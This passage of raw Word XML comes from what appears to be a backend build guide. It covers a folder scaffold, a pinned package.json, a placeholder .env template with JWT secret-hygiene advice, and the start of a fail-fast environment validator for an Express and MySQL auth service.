                <w:color w:val="2F3545"/>
                <w:sz w:val="21"/>
              </w:rPr>
              <w:t>The Build Order Rule</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>You cannot test STEP N until STEPS 1..N-1 are working.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Step 1 is the foundation: every other step requires env + logger + db pool to exist.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>2.1  Folder Scaffold</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Created with mkdir -p so the entire skeleton appears in one shot. Adopting the locked folder convention from the build doc (src/config, src/middleware, src/modules/auth, src/modules/users, src/utils).</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bash</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># From within SOFTWARE CODE/BE/</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>mkdir -p src/config src/middleware src/modules/auth src/modules/users src/utils</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>2.2  package.json — Locked Dependency Pin</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Every dep version is pinned with a caret to allow patches but block breaking changes. Notable absences: NO typescript, NO @types/* — this is a JS-only project.</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package.json</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>{</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  "name": "cmcmis-be",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  "version": "1.0.0",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  "private": true,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  "description": "CMCMIS_SIMPLIFIED Phase 4 backend — auth + RBAC HTTP layer.",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  "main": "src/server.js",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  "scripts": {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    "dev":   "node --watch src/server.js",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    "start": "node src/server.js"</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"engines": { "node": "&gt;=18.0.0" },</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  "dependencies": {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    "express": "^4.19.2", "mysql2": "^3.11.0",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    "bcryptjs": "^2.4.3", "jsonwebtoken": "^9.0.2",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    "zod": "^3.23.0", "dotenv": "^16.4.5", "envalid": "^8.0.0",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    "helmet": "^7.1.0", "cors": "^2.8.5", "cookie-parser": "^1.4.7",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    "compression": "^1.7.4", "express-rate-limit": "^7.4.0",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    "pino": "^9.4.0", "pino-http": "^10.3.0", "pino-pretty": "^11.2.0",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    "dayjs": "^1.11.13"</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w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>2.3  .env.example — The Source of Truth for Configuration</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Committed template. The real .env is gitignored. The values are PLACEHOLDERS — the JWT secrets MUST be replaced with 32-byte random strings before any environment touches real data.</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.env</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># Server</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>NODE_ENV=development</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>PORT=3000</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>API_BASE_PATH=/api/v1</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>CORS_ORIGIN=http://localhost:5173</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Database (Phase 3 sealed schema)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>DB_HOST=localhost</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>DB_PORT=3306</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>DB_USER=root</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>DB_PASSWORD=</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>DB_NAME=final</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>DB_POOL_LIMIT=15</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JWT secrets — generate with:</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>#   node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># MUST differ from each other; env.js refuses to boot if they are equal.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>JWT_ACCESS_SECRET=&lt;replace&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>JWT_REFRESH_SECRET=&lt;replace&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>JWT_ACCESS_TTL_SEC=900       # 15 minutes</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>JWT_REFRESH_TTL_SEC=604800   # 7 days</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Bcrypt — 10 in dev (fast), 12 in production (M11)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>BCRYPT_ROUNDS=10</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Rate limiting — /login: 10 attempts per 15 min per IP</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>LOGIN_RATE_WINDOW_MS=900000</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>LOGIN_RATE_MAX=10</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Logging — debug while developing, info in prod</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>LOG_LEVEL=debug</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="10200"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="10200"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FEE2E2"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="24" w:color="B91C1C"/>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="80"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="B91C1C"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">SECURITY ALERT  ·  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="21"/>
              </w:rPr>
              <w:t>JWT secret hygiene</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>NEVER commit .env to git — .gitignore must include it.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>JWT_ACCESS_SECRET MUST differ from JWT_REFRESH_SECRET; env.js asserts this at boot.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>If access and refresh shared a secret, a leaked access token could be replayed as a refresh token, turning a 15-minute exposure into a 7-day one.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Rotate secrets quarterly; rotate immediately on breach.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>2.4  src/config/env.js — Fail-Fast Boot Validator</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Reads process.env exactly once, validates every variable the app depends on, coerces numeric values, freezes the result, and exports it as a single object. If anything is missing or malformed the process EXITS BEFORE Express ever opens a port. Fail-fast at boot is orders of magnitude cheaper than debugging an ECONNREFUSED at 2am.</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src/config/env.js</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>'use strict';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>require('dotenv').config();</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const { cleanEnv, str, num, port } = require('envalid');</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const env = cleanEnv(process.env, {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  NODE_ENV:     str({ choices: ['development', 'production', 'test'] }),</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  PORT:         port({ default: 3000 }),</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  API_BASE_PATH: str({ default: '/api/v1' }),</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  CORS_ORIGIN:  str(),</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  DB_HOST: str(), DB_PORT: port({ default: 3306 }),</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  DB_USER: str(), DB_PASSWORD: str({ default: '' }),</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  DB_NAME: str(), DB_POOL_LIMIT: num({ default: 15 }),</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  JWT_ACCESS_SECRET:  str(),</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  JWT_REFRESH_SECRET: str(),</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  JWT_ACCESS_TTL_SEC:  num({ default: 900 }),</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
